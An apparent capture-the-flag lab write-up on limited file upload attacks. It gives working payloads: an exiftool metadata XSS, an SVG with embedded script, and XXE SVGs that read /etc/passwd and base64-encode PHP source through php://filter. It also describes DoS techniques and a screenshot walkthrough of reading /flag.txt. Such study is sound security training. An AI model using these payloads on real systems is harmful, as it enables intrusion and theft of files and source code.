# Limited File Uploads

- The above exercise contains an upload functionality that should be secure against arbitrary file uploads.
 Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

  `Hint`: Use an attack that can read files, and don't forget to check the page source!
- Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
  
  `Hint`: Use a different payload to read source code.
---
## Possible Attacks

If the web applications displays an image's metadata after its upload, we can perform the following attack:
- `XSS` via comment injection:
  ```bash
  exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
  ```
  `Note`: It is possible to perform this attack using one of the Metadata parameters that accept raw text, like the `Comment` or 
  `Artist` parameters. Furthermore, if we change the image's `MIME-Type` to `text/html`, some web applications may show it as an HTML 
  document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
---
## `.svg` Attacks
- Custom `.svg` image:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
      <circle cx="50" cy="50" r="40" fill="red" />
  </svg>
  ```
- `XSS` via HTB.svg:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
      <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
      <script type="text/javascript">alert(window.origin);</script>
  </svg>
  ```
## Common file disclosure
- `XXE` via `.svg` file:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <svg>&xxe;</svg>
  ```
## Source code file Disclosure
- `XXE` via `.svg` file with `PHP Wrappers`:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
  <svg>&xxe;</svg>
  ```

Another similar attack that is also achievable through these file types is an SSRF attack. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions.

Many file upload vulnerabilities may lead to a Denial of Service (DOS) attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks

we can also utilize a Decompression Bomb with file types that use data compression, like ZIP archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a Pixel Flood attack with some image files that utilize image compression, like JPG or PNG. We can create any JPG image file with any image size (e.g. 500x500), and then manually modify its compression data to say it has a size of (0xffff x 0xffff), which results in an image with a perceived size of 4 Gigapixels.

If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. ../../../etc/passwd), which may also cause the server to crash. 

---

## Exercise

We attempted to upload a simple `.png` image but we received the response with the message "Only SVG images are allowed":
![image](https://github.com/user-attachments/assets/36479000-2f72-4e4b-8893-99deeb070204)

Since only `.svg` extensions are allowed, we attempt to upload a basic `.svg` image:
![image](https://github.com/user-attachments/assets/c958b80b-f3c5-4f0c-ba94-362fc3033bca)
We discover that the page is displaying the image previously loaded by reading de source code from the backend:
![image](https://github.com/user-attachments/assets/120ad4f8-7ab8-42c7-93cc-d1904a5ecd0b)
![image](https://github.com/user-attachments/assets/eae9ef81-0d82-4812-89c1-34f48ad16fdf)



We performed a `XSS` attack via `.svg` upload:
![image](https://github.com/user-attachments/assets/1d6ebcf9-91d4-4f2f-b4e9-fed9a43451ab)
![image](https://github.com/user-attachments/assets/272a725a-ae20-4873-b278-32c3e253d3f1)
![image](https://github.com/user-attachments/assets/06358b9a-0a9e-48fa-b253-d6687a6899b7)

Then we performed a `XXE` attack in order to get the content of the `/flag.txt` file:
![image](https://github.com/user-attachments/assets/d9f1a541-f7fb-4ab3-97e7-dac94709eac5)
![image](https://github.com/user-attachments/assets/fa0b467f-639f-4f5d-97f1-fe024e57d6fa)


To read the source code of `upload.php` we perform a `XXE` attack via `PHP Wrapper`:
![image](https://github.com/user-attachments/assets/ff931621-7fcc-4075-9c62-a9153bc23c57)
![image](https://github.com/user-attachments/assets/7beb39b8-141b-46f0-8e7a-3404be459892)

Then we get de raw source code and solve the lab:
![image](https://github.com/user-attachments/assets/282bacad-57ed-49dd-aa1c-2c819661e353)






